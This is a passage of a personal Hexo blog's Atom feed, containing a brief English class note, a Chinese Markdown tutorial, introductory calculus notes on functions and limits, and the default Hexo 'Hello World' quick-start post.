&lt;h3 id=&#34;my-class&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#my-class&#34;&gt;#&lt;/a&gt; My class&lt;/h3&gt;
&lt;p&gt;The spoken English class focuses on discussion.&lt;br /&gt;
Yet my classmates are pretty shy so that few discusions happened when we were dvided into the same discuss room.&lt;/p&gt;
</content>
        <category term="札记" scheme="http://example.com/categories/%E6%9C%AD%E8%AE%B0/" />
        <category term="随笔" scheme="http://example.com/tags/%E9%9A%8F%E7%AC%94/" />
        <updated>2022-09-08T06:40:00.000Z</updated>
    </entry>
    <entry>
        <id>http://example.com/2022/09/07/Note%20of%20markdown/Note%20of%20markdown/</id>
        <title>Notes Of Markdown</title>
        <link rel="alternate" href="http://example.com/2022/09/07/Note%20of%20markdown/Note%20of%20markdown/"/>
        <content type="html">&lt;p&gt;为了搭建自己的 blog，clone 了个模板。现在也是时候该来学写 blog 了。 &lt;s&gt;（什么写 blog 还要学不是有手就行？？）&lt;/s&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h1 id=&#34;note-of-markdown&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#note-of-markdown&#34;&gt;#&lt;/a&gt; Note Of Markdown&lt;/h1&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;1-准备preparation&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-准备preparation&#34;&gt;#&lt;/a&gt; 1. 准备（Preparation）&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;应用软件：Video Studio Code&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;工作文件：makedown (后缀为 &lt;code&gt;.md&lt;/code&gt; ）&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;2-开始beginning&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-开始beginning&#34;&gt;#&lt;/a&gt; 2. 开始（Beginning）&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;创建一个文本文档更改后缀为 &lt;code&gt;.md&lt;/code&gt;  然后用 Visual Studio Code 打开，或者先打开 Visual Studio Code 然后新建一个后缀为 &lt;code&gt;.md&lt;/code&gt;  的文件。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;打开侧边预览&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;在view中打开 Command Palette 然后输入Open Preview to the Side
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;3语法grammar&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3语法grammar&#34;&gt;#&lt;/a&gt; 3. 语法（Grammar）&lt;/h3&gt;
&lt;h5 id=&#34;标题title&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#标题title&#34;&gt;#&lt;/a&gt; 标题（Title)&lt;/h5&gt;
&lt;ol&gt;
&lt;li&gt;标题可分为一到六级分别用 #、##、###...... 以此类推&lt;br /&gt;
其中 #表示的最大，###### 最小。语法如下：&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;# 标题1
## 标题2
### 标题3
...
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;换行直接回车&lt;/li&gt;
&lt;li&gt;字体
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;*内容*&lt;/code&gt;  为斜体&lt;/li&gt;
&lt;li&gt;&lt;code&gt;**内容**&lt;/code&gt;  为加粗&lt;/li&gt;
&lt;li&gt;&lt;code&gt;***内容***&lt;/code&gt;  为粗斜体&lt;/li&gt;
&lt;li&gt;&lt;code&gt;~~内容~~&lt;/code&gt;  为删除线&lt;br /&gt;
表现：&lt;em&gt;内容&lt;/em&gt;、&lt;strong&gt;内容&lt;/strong&gt;、&lt;em&gt;&lt;strong&gt;内容&lt;/strong&gt;&lt;/em&gt;、&lt;s&gt;内容&lt;/s&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;4插入insert&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4插入insert&#34;&gt;#&lt;/a&gt; 4. 插入 (Insert)&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;插入图片&lt;/p&gt;
&lt;figure class=&#34;highlight markdown&#34;&gt;&lt;figcaption data-lang=&#34;markdown&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;![图片名称](图片链接 &#39;Alt&#39;)&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;插入链接&lt;/p&gt;
&lt;figure class=&#34;highlight markdown&#34;&gt;&lt;figcaption data-lang=&#34;markdown&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token url&#34;&gt;[&lt;span class=&#34;token content&#34;&gt;内容&lt;/span&gt;](&lt;span class=&#34;token url&#34;&gt;链接&lt;/span&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;混合使用&lt;/p&gt;
&lt;figure class=&#34;highlight markdown&#34;&gt;&lt;figcaption data-lang=&#34;markdown&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;[![图片名称](图片链接 &#39;Alt&#39;)](链接)&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这样就对图片添加了超链接。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;5其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5其他&#34;&gt;#&lt;/a&gt; 5. 其他&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90eXBvcmFpby5jbi8=&#34;&gt;Typro&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;更多语法参照&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucnVub29iLmNvbS9odG1sL2h0bWwtdHV0b3JpYWwuaHRtbA==&#34;&gt; HTML&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</content>
        <category term="札记" scheme="http://example.com/categories/%E6%9C%AD%E8%AE%B0/" />
        <category term="Notes" scheme="http://example.com/tags/Notes/" />
        <updated>2022-09-07T15:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://example.com/2022/09/06/%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0%E4%B8%80/</id>
        <title>高等数学笔记一</title>
        <link rel="alternate" href="http://example.com/2022/09/06/%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
        <content type="html">&lt;h1 id=&#34;高等数学一&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#高等数学一&#34;&gt;#&lt;/a&gt; 高等数学・一&lt;/h1&gt;
&lt;hr /&gt;
&lt;p&gt;学习时做的一些笔记，顺便对内容梳理一遍。^0&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;第一章-函数与极限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第一章-函数与极限&#34;&gt;#&lt;/a&gt; 第一章 函数与极限&lt;/h2&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;第一节-映射与函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第一节-映射与函数&#34;&gt;#&lt;/a&gt; 第一节 映射与函数&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;映射&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;与 x 所对应的 y 称为 x 在映射 f 下的象。&lt;br /&gt;
x 称为 y 在 f 下的原象。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;满射、一一映射、单射、双射&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A 映射得到的 B 集合等于映射的目标集合则是满射。&lt;/p&gt;
&lt;p&gt;对每个 y 都有唯一一个 x 对应，则是&lt;strong&gt;单射&lt;/strong&gt;或称&lt;strong&gt;一一映射&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;若 f 既是满射又是单射则称为&lt;strong&gt;双射&lt;/strong&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;函数定义与表示方法&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;特殊函数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;狄利克雷函数&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/00_2.png&#34; alt=&#34;00_2&#34; title=&#34;狄利克雷函数&#34; /&gt;&lt;/p&gt;
&lt;p&gt;狄利克雷函数是一个定义在实数范围上、值域不连续的函数。狄利克雷函数的图像以 Y 轴为对称轴，是一个偶函数，它处处不连续，处处极限不存在，不可黎曼积分。这是一个处处不连续的可测函数。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;符号函数&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/00_3-1663132097343.png&#34; alt=&#34;00_3&#34; title=&#34;符号函数&#34; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;取整函数&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/image-20220914131129520.png&#34; alt=&#34;image-20220914131129520&#34; /&gt;&lt;/p&gt;
&lt;p&gt;函数 y=[x] 称为取整函数，也称&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTklQUIlOTglRTYlOTYlQUYlRTUlODclQkQlRTYlOTUlQjAvMjY3MDk1MT9mcm9tTW9kdWxlPWxlbW1hX2lubGluaw==&#34;&gt;高斯函数&lt;/span&gt;。其中不超过实数 x 的最大整数称为 x 的整数部分，记作 [x]。该函数被广泛应用于&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlOTUlQjAlRTglQUUlQkEvMzcwMD9mcm9tTW9kdWxlPWxlbW1hX2lubGluaw==&#34;&gt;数论&lt;/span&gt;，函数绘图和计算机领域。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;函数的有界性&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;函数 f (x) 在 D 上有界的充要条件是 f (x) 在 D 上既有上界又有下界。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;函数的单调性&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;单调增 (减) 函数&lt;/li&gt;
&lt;li&gt;严格单调增 (减) 函数&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;函数的四则运算&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;复合函数&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;形如： &lt;strong&gt;f(g(u(x)))&lt;/strong&gt; 或 &lt;strong&gt;f&lt;/strong&gt; o &lt;strong&gt;g&lt;/strong&gt; o &lt;strong&gt;u&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;反函数&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;反函数的单调性基本归纳于 &lt;strong&gt;先外后内，同增异减&lt;/strong&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;初等函数&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;初等函数是由&lt;strong&gt;幂函数（power function）、指数函数（exponential function）、对数函数（logarithmic function）、三角函数（trigonometric function）、反三角函数（inverse trigonometric function&lt;/strong&gt; 与常数经过有限次的有理运算（加、减、乘、除、有理数次乘方、有理数次开方）及有限次函数复合所产生，并且能用一个解析式表示的函数。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;第二节-数列的极限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第二节-数列的极限&#34;&gt;#&lt;/a&gt; 第二节 数列的极限&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;邻域&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;邻域&lt;/li&gt;
&lt;li&gt;去心邻域&lt;/li&gt;
&lt;li&gt;左 (右) 邻域&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;数列基本概念&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;有限 or 无限&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通项公式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;整标函数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;子数列&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;单调性&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;作差或作商求单调性。有时候利用数列的单调性可能会得到惊喜的解题方式。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlOTUlQjAlRTUlODglOTclRTYlOUUlODElRTklOTklOTA/ZnJvbU1vZHVsZT1sZW1tYV9zZWFyY2gtYm94&#34;&gt;数列极限&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;收敛数列与数列的有界性&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;tip：数列收敛一定有界，数列有界不一定收敛&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;极限唯一性 &amp;amp; 有界性 &amp;amp; 保号性&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;极限四则运算法则（严格意义上要分别证明数列的与函数的）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;第三节-函数的极限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第三节-函数的极限&#34;&gt;#&lt;/a&gt; 第三节 函数的极限&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlODclQkQlRTYlOTUlQjAlRTYlOUUlODElRTklOTklOTAvNzI3MDgz&#34;&gt;函数极限&lt;/span&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/00_1.png&#34; alt=&#34;00_1&#34; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;函数某点极限存在的充要条件是左右极限都存在且相等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlQjUlQjclRTYlQjYlODUlRTUlQUUlOUElRTclOTAlODY/ZnJvbU1vZHVsZT1sZW1tYV9zZWFyY2gtYm94&#34;&gt;海涅 (Heine) 定理&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;求函数极限&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;简单的有限次函数，如果最高次项系数相等比较最高次项系数，如果不等，次数高的为高阶无穷大量。&lt;/li&gt;
&lt;li&gt;妙用，分子有理化，分母有理化。&lt;/li&gt;
&lt;li&gt;通分消去。&lt;/li&gt;
&lt;li&gt;立方差、因式分解。&lt;/li&gt;
&lt;li&gt;裂项等将无穷项收缩的方法。&lt;/li&gt;
&lt;li&gt;......&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;复合函数极限&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;第四节-函数的连续性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第四节-函数的连续性&#34;&gt;#&lt;/a&gt; 第四节 函数的连续性&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;连续性概念&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;由极限的性质可知，一个函数在某点连续的充要条件是它在该点左右都连续。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;间断点分类&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</content>
        <category term="Mathematics" scheme="http://example.com/categories/Mathematics/" />
        <category term="Notes" scheme="http://example.com/tags/Notes/" />
        <updated>2022-09-06T15:00:09.999Z</updated>
    </entry>
    <entry>
        <id>http://example.com/2022/09/06/hello-world/</id>
        <title>Hello World</title>
        <link rel="alternate" href="http://example.com/2022/09/06/hello-world/"/>
        <content type="html">&lt;p&gt;Welcome to &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvLw==&#34;&gt;Hexo&lt;/span&gt;! This is your very first post. Check &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv&#34;&gt;documentation&lt;/span&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=&#34;&gt;troubleshooting&lt;/span&gt; or you can ask me on &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==&#34;&gt;GitHub&lt;/span&gt;.&lt;/p&gt;
&lt;h2 id=&#34;quick-start&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#quick-start&#34;&gt;#&lt;/a&gt; Quick Start&lt;/h2&gt;
&lt;h3 id=&#34;create-a-new-post&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#create-a-new-post&#34;&gt;#&lt;/a&gt; Create a new post&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo new &lt;span class=&#34;token string&#34;&gt;&#34;My New Post&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s&#34;&gt;Writing&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;run-server&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#run-server&#34;&gt;#&lt;/a&gt; Run server&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo server&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=&#34;&gt;Server&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;generate-static-files&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#generate-static-files&#34;&gt;#&lt;/a&gt; Generate static files&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo generate&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s&#34;&gt;Generating&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;deploy-to-remote-sites&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#deploy-to-remote-sites&#34;&gt;#&lt;/a&gt; Deploy to remote sites&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo deploy&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s&#34;&gt;Deployment&lt;/span&gt;&lt;/p&gt;
</content>
        <updated>2022-09-05T16:21:14.363Z</updated>
    </entry>
</feed>
